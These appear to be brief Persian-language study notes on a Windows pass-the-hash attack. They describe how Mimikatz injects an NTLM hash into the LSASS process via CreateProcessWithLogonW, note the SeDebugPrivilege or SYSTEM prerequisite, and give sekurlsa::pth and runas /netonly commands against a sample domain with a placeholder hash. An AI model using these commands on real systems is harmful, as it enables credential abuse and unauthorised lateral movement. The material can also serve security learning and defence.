

در این فرایند ما Provider MSV رو بایپس میکنیم و داخل پروسس lsass هش رو با هش مقایسه میکنیم

API for authentication 
createprocesswithlogonw API 

این api میاد شبیه سازی میکنه authentiacation رو 
یه پروسس میاد میسازه که این پروسس میخواد لاگین کنه 

بعد از اون Mimikatz میاد به LSA هش ntlm مارو تزریق میکنه 

LSA process  NTLM hash -----> Injected

پیش نیاز برای انجام این کار دسترسی به Privilege SePrivilegeDebug و یا دسترسی SYSTEM هست



```
sekurlsa::pth /user:admin /domain:charon.local /ntlm:vfbw4e56twkbt456l44534bbffwer4
```


```
sekurlsa::pth /user:admin /domain:charon.local /ntlm:vfbw4e56twkbt456l44534bbffwer4 /run:notepad.exe
```

میتونیم بهش دستور هم بدیم 

```
runas /netonly /user:administrator\charon.local cmd.exe
```

